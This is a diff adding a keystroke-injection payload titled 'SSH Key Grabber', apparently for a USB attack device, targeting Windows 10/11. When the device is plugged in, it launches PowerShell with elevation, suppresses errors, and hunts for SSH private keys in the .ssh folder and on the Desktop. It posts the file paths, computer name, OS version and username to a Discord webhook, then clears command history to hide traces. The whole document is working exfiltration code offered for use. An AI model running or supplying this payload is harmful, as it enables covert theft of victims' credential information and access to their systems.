@@ -1,0 +1,135 @@
+REM #
+REM # Title:          SSH Key Grabber
+REM # Author:         LuKres
+REM # Version:        1.0
+REM # Category:       Exfiltration
+REM # Target:         Microsoft Windows 10/11
+REM #
+REM # Description:    1) Scans default SSH key locations
+REM #                 2) Performs recursive pattern matching
+REM #                 3) Reports findings via Discord webhook
+REM #                 4) Cleans up traces
+REM #
+REM # TESTED ON
+REM # ===========
+REM # Microsoft Windows 10 Pro Version 22H2 (PowerShell 5.1)
+REM # Microsoft Windows 11 Pro Version 23H2 (PowerShell 5.1)
+REM #
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 2000
+LEFTARROW
+ENTER
+DELAY 3000
+
+STRING $ErrorActionPreference = 'SilentlyContinue'; $ProgressPreference = 'SilentlyContinue';
+ENTER
+DELAY 500
+
+STRING function Get-SSHKeys {
+ENTER
+STRING     try {
+ENTER
+STRING         $keys = @()
+ENTER
+STRING         # Method 1: Default SSH directory
+STRING         $sshPath = Join-Path $env:USERPROFILE '.ssh'
+ENTER
+STRING         if(Test-Path $sshPath) {
+ENTER
+STRING             $keys += Get-ChildItem $sshPath -Filter "*" -File | Where-Object { $_.Length -gt 0 }
+ENTER
+STRING         }
+ENTER
+STRING         # Method 2: Recursive search
+STRING         $desktopPath = [Environment]::GetFolderPath('Desktop')
+ENTER
+STRING         $recursiveKeys = Get-ChildItem -Path $desktopPath -Recurse -File | Where-Object {
+ENTER
+STRING             (Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue) -match "PRIVATE KEY"
+ENTER
+STRING         }
+ENTER
+STRING         $keys += $recursiveKeys
+ENTER
+STRING         return $keys
+ENTER
+STRING     } catch { return $null }
+ENTER
+STRING }
+ENTER
+
+STRING function Send-ToDiscord {
+ENTER
+STRING     param($keys)
+ENTER
+STRING     $webhook = "!!!PASTE_WEBHOOK_HERE!!!"
+ENTER
+STRING     $computerInfo = Get-WmiObject Win32_OperatingSystem
+ENTER
+STRING     $keyInfo = $keys | ForEach-Object {
+ENTER
+STRING         "- $($_.FullName) ($(Get-Date $_.LastWriteTime -Format 'yyyy-MM-dd HH:mm:ss'))"
+ENTER
+STRING     }
+ENTER
+STRING     $body = @{
+ENTER
+STRING         content = "🔑 **SSH Keys Found!**`n"
+ENTER
+STRING         embeds = @(
+ENTER
+STRING             @{
+ENTER
+STRING                 title = "SSH Key Information"
+ENTER
+STRING                 fields = @(
+ENTER
+STRING                     @{
+ENTER
+STRING                         name = "System Info"
+ENTER
+STRING                         value = "Computer: $($computerInfo.CSName)`nWindows: $($computerInfo.Caption) $($computerInfo.Version)`nUser: $($env:USERNAME)"
+ENTER
+STRING                     },
+ENTER
+STRING                     @{
+ENTER
+STRING                         name = "Keys Found"
+ENTER
+STRING                         value = ($keyInfo -join "`n")
+ENTER
+STRING                     }
+ENTER
+STRING                 )
+ENTER
+STRING                 timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
+ENTER
+STRING             }
+ENTER
+STRING         )
+ENTER
+STRING     } | ConvertTo-Json -Depth 4
+ENTER
+STRING     try {
+ENTER
+STRING         Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
+ENTER
+STRING     } catch {}
+ENTER
+STRING }
+ENTER
+
+STRING $keys = Get-SSHKeys
+ENTER
+STRING if($keys) { Send-ToDiscord $keys }
+ENTER
+
+STRING Remove-Variable -Name keys -ErrorAction SilentlyContinue
+ENTER
+STRING Clear-History; exit
+ENTER
